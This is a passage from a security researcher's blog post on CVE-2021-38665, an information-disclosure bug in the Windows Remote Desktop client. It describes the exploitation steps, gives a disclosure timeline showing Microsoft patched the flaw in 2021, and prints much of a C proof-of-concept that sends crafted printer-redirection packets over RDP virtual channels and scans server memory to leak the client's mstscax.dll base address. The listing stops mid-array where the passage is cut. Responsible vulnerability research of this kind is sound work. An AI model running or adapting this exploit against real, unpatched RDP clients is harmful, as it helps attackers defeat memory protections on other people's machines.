style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>HANDLE virtual_channel <span style=color:#f92672>=</span> WTSVirtualChannelOpenEx(
</span></span><span style=display:flex><span>  WTS_CURRENT_SESSION,
</span></span><span style=display:flex><span>  channel_name,
</span></span><span style=display:flex><span>  is_dynamic <span style=color:#f92672>?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p>Then, we can write to the channel handle this way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>WTSVirtualChannelWrite(
</span></span><span style=display:flex><span>  virtual_channel,
</span></span><span style=display:flex><span>  buffer,
</span></span><span style=display:flex><span>  (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)length,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>bytes_written
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p><strong>Repeat the writing</strong> enough times to increase probability of leaking interesting stuff and we&rsquo;re done with the first steps.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>32</span>; k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  write_to_virtual_channel(leak_heap, <span style=color:#66d9ef>sizeof</span>(leak_heap));
</span></span><span style=display:flex><span>  Sleep(<span style=color:#ae81ff>200</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>At this point, the client&rsquo;s registry should be filled with memory leaks.</p><p>Next step, we send garbage to the <code>Graphics</code> dynamic channel to <strong>make the client reconnect</strong>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>connect_to_virtual_channel(<span style=color:#e6db74>&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, DYNAMIC_CHANNEL);
</span></span><span style=display:flex><span>write_to_virtual_channel(<span style=color:#e6db74>&#34;fuzzed up beyond all repair&#34;</span>, <span style=color:#ae81ff>27</span>);
</span></span><span style=display:flex><span>close_virtual_channel();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Wait for the client to reconnect
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Sleep(<span style=color:#ae81ff>20000</span>);
</span></span></code></pre></div><p>This behavior is a bit random. Sometimes it will automatically reconnect the client, sometimes it will bring the client back to the connection window (without restarting the process) and they will have to click &ldquo;Connect&rdquo; again. There are probably other better ways to achieve that.</p><p>As for the &ldquo;wait for the client to reconnect&rdquo; part, my POC merely sleeps but it could also do better by monitoring when the client exactly reconnects.</p><p>The <strong>final step</strong> is to <strong>retrieve the leak</strong> sent by the client. I struggled with this part because I could not simply read from the virtual channel using <code>WTSVirtualChannelRead</code>. In order to read from a virtual channel, you need a handle to it, that you got from opening it.</p><p>The fact that the PDU is sent upon first initialization of the RDPDR channel, which happens very early when the client connects to the server, complicates things a bit. You need to achieve some kind of race condition to open and read from the channel right after the client connects and sends the packet, but also right before the (real) server itself connects to the channel and handles the packet? I wasn&rsquo;t sure how it&rsquo;d work so I decided to look for another way.</p><p>Possible solutions include:</p><ul><li>Using a custom RDP server implementation</li><li>Intercepting packets at the network level, but it requires decoding the whole RDP stack that has several layers of encryption which is a hassle</li><li>Hooking the server-side handler for the channel in order to log the PDU contents</li></ul><p>I eventually opted for <strong>scanning</strong> the RDP server&rsquo;s <strong>svchost memory</strong> to retrieve the client&rsquo;s PDU. It may be overkill, but it works.</p><p>Therefore, the rest of the POC is essentially finding the TermService svchost PID, scanning memory with <code>VirtualQueryEx</code>/<code>ReadProcessMemory</code> and looking for a known crib such as the wide string <code>Brother</code> (beginning of our <code>PrinterName</code>). Recognizing known vtable offsets then classicly allows to calculate <code>mstscax.dll</code>&rsquo;s base address.</p><p>Example run on the Insider Build:</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png target=_blank><img src=/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png alt="Leak mstscax.dll base address in Windows Insider Build"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Leak mstscax.dll base address in Windows Insider Build</figcaption></figure></p><h1 id=conclusion>Conclusion</h1><p>This vulnerability is not necessarily intricate: the core of the bug is just missing null bytes causing an out-of-bounds read. However, the execution makes it more interesting than it should be, and the process of discovering the bug&rsquo;s root cause really shows the unexpected side effects of fuzzing. I believe this latter point is a key component that one should take into account when using fuzzing techniques for vulnerability research.</p><p>On a more personal note, for a first experience in vulnerability research, I am glad I was able to find a vulnerability in Windows that led to a CVE and for which I could also provide a reliable proof of concept.</p><h1 id=disclosure-timeline>Disclosure Timeline</h1><ul><li>2021-07-22 &mdash; Sent vulnerability report to MSRC (Microsoft Security Response Center)</li><li>2021-07-23 &mdash; Microsoft started reviewing and reproducing</li><li>2021-08-03 &mdash; Microsoft acknowledged the vulnerability and started developing a fix. They also started reviewing this case for a potential bounty award.</li><li><strong>2021-08-04 &mdash; Microsoft assessed the vulnerability as <em>Information Disclosure</em> with <em>Important</em> severity. Bounty award: $1,000.</strong></li><li>2021-08-13 &mdash; The vulnerability was assigned CVE-2021-38665.</li><li>2021-11-09 &mdash; Microsoft released the security patch.</li></ul><h1 id=full-proof-of-concept-source-code>Full Proof-of-Concept source code</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>Compilation: clang poc.c -o poc.exe -l wsock32 -l wtsapi32 -l advapi32
</span></span></span><span style=display:flex><span><span style=color:#75715e>Run as SYSTEM.
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define _CRT_SECURE_NO_WARNINGS
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;io.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;winsock2.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;winsvc.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;wtsapi32.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define MAX_VC_WRITE_TRIES 20
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define STATIC_CHANNEL 0
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define DYNAMIC_CHANNEL 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> vtable_offsets[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 10.0.19041.844
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x5c88e0</span>, <span style=color:#75715e>// const CTSMsg::`vftable`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x5c92d8</span>, <span style=color:#75715e>// const CMemory::`vftable`{for `CImplIUknown&lt;struct IUnknown&gt;`}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// 10.0.21354.1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x62c048</span>, <span style=color:#75715e>// const CFileRedirector::`vftable&#39;{for `INonDelegatingUnknown&#39;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x62c1b8</span>, <span style=color:#75715e>// const CTSSyncWaitResult::`vftable&#39;{for `INonDelegatingUnknown&#39;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x62c238</span>, <span style=color:#75715e>// const CTSMsg::`vftable&#39;{for `CTSObject&#39;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x62dc20</span>, <span style=color:#75715e>// const CTSPooledUnknown::`vftable&#39;{for `INonDelegatingUnknown&#39;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#ae81ff>0x62de48</span>  <span style=color:#75715e>// const CMemory::`vftable&#39;{for `CImplIUnknown&lt;struct IUnknown&gt;&#39;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HANDLE rdp_server;
</span></span><span style=display:flex><span>HANDLE virtual_channel;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hexdump</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#66d9ef>int</span> length)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%02x &#34;</span>, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)buffer[i]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hook_to_rdp</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    rdp_server <span style=color:#f92672>=</span> <span style=color:#a6e22e>WTSOpenServerA</span>(<span style=color:#e6db74>&#34;localhost&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>rdp_server)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not open RDP server handle. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Hooked to local RDP server.</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>connect_to_virtual_channel</span>(<span style=color:#66d9ef>char</span> channel_name[], <span style=color:#66d9ef>int</span> n_tries, <span style=color:#66d9ef>int</span> channel_type)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Attempting to open Virtual Channel...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> tries <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        tries<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (tries <span style=color:#f92672>&gt;=</span> n_tries)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        virtual_channel <span style=color:#f92672>=</span> <span style=color:#a6e22e>WTSVirtualChannelOpenEx</span>(WTS_CURRENT_SESSION, channel_name, channel_type <span style=color:#f92672>==</span> DYNAMIC_CHANNEL <span style=color:#f92672>?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (virtual_channel)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (tries <span style=color:#f92672>==</span> n_tries)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Couldn&#39;t open Virtual Channel &#39;%s&#39; in %d tries. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, channel_name, tries, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Opened Virtual Channel &#39;%s&#39; in %d tries.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, channel_name, tries);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>write_to_virtual_channel</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#66d9ef>int</span> length)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> bytes_written;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> tries <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        tries<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (tries <span style=color:#f92672>&gt;=</span> MAX_VC_WRITE_TRIES)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>WTSVirtualChannelWrite</span>(virtual_channel, buffer, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)length, <span style=color:#f92672>&amp;</span>bytes_written))
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>500</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (tries <span style=color:#f92672>==</span> MAX_VC_WRITE_TRIES)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not write to Virtual Channel. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Successfully wrote %lu bytes to Virtual Channel.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, bytes_written);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>hexdump</span>(buffer, length);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>close_virtual_channel</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Closing Virtual Channel.</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>WTSVirtualChannelClose</span>(virtual_channel);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(virtual_channel);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>close_rdp</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Closing RDP handle.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>WTSCloseServer</span>(rdp_server);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(rdp_server);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DWORD <span style=color:#a6e22e>get_termservice_pid</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    DWORD bytesNeeded, servicesNum, lastError, pid;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> serviceName[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    SC_HANDLE manager <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenSCManager</span>(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (manager <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not open manager. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    BOOL status <span style=color:#f92672>=</span> <span style=color:#a6e22e>EnumServicesStatusEx</span>(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>bytesNeeded, <span style=color:#f92672>&amp;</span>servicesNum, NULL, NULL);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>status <span style=color:#f92672>&amp;&amp;</span> (lastError <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetLastError</span>()) <span style=color:#f92672>!=</span> ERROR_MORE_DATA)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not enumerate services. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, lastError);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    PBYTE lpBytes <span style=color:#f92672>=</span> (PBYTE)<span style=color:#a6e22e>malloc</span>(bytesNeeded);
</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> <span style=color:#a6e22e>EnumServicesStatusEx</span>(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, <span style=color:#f92672>&amp;</span>bytesNeeded, <span style=color:#f92672>&amp;</span>servicesNum, NULL, NULL);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>status)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not enumerate services. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(lpBytes);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ENUM_SERVICE_STATUS_PROCESS <span style=color:#f92672>*</span>lpServiceStatus <span style=color:#f92672>=</span> (ENUM_SERVICE_STATUS_PROCESS <span style=color:#f92672>*</span>)lpBytes;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> servicesNum; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>strcmp</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)lpServiceStatus[i].lpServiceName, <span style=color:#e6db74>&#34;TermService&#34;</span>))
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            pid <span style=color:#f92672>=</span> lpServiceStatus[i].ServiceStatusProcess.dwProcessId;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Found TermService (PID %lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pid);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>free</span>(lpBytes);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> pid;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not find TermService.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>free</span>(lpBytes);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    DWORD svchostPid;
</span></span><span style=display:flex><span>    HANDLE hProcess;
</span></span><span style=display:flex><span>    MEMORY_BASIC_INFORMATION info;
</span></span><span style=display:flex><span>    SIZE_T bytesRead;
</span></span><span style=display:flex><span>    LPVOID buffer;
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span>leak;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> leak_heap[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// DR_PRN_ADD_CACHEDATA
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x50</span>,                         <span style=color:#75715e>// Header
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// EventId
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x4f</span>, <span style=color:#ae81ff>0x4d</span>, <span style=color:#ae81ff>0x32</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x3a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#75715e>// PortDosName
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// PnpNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x2a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// DriverNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x2a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// PrintNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// CachedFieldsLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// DriverName
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x6f</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x74</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x50</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x55</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>        <span style=color:#75715e>// PrinterName
